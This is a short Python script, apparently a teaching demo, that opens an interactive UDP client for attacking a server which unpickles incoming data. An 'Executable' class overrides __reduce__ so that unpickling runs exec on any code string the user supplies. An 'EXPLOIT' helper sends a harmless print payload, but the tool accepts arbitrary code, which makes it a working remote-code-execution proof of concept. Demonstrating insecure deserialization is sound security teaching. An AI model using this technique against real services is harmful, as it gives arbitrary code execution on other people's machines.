#!/usr/bin/env python3
import socket
import pickle
import pprint
import code as _code

import common

class Client(object):
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send(self, data: object,
        host: str = common.HOST, port: int = common.PORT,
        flags: int = 0):
        return self.socket.sendto(
            pickle.dumps(data),
            flags,
            (host, port)
        )

    def stop(self, code: int = 0):
        self.send(common.STOP)
        exit(code)

class Executable(object):
    '''Customize the serialization of this object when instanciating it'''

    def __init__(self, target: callable, *args):
        self.target = target
        self.args = args

    def __reduce__(self):
        return (self.target, self.args)

    @classmethod
    def exec(cls, client: Client, code: str):
        '''Send any code to remote execute on `client` !'''
        executable = cls(exec, code)
        return client.send(executable)

def EXPLOIT(client: Client):
    '''Sends malicious code to `client` !'''
    return Executable.exec(client,
        'for i in range(999): print(i)\n'
        'print("This is bad !")'
    )

client = Client()
_banner = '''\
 ~ Sweet Pickle !

Available names:
> %s

Help:
> You can type `client.send('test')` to send pickled data !
> Or just do `EXPLOIT(client)` ;)

Interactive Mode: Have fun ! :P\
''' % ', '.join(n for n in dir() if not n.startswith('_'))
_code.interact(banner='\n' * 16 + _banner, local=globals())
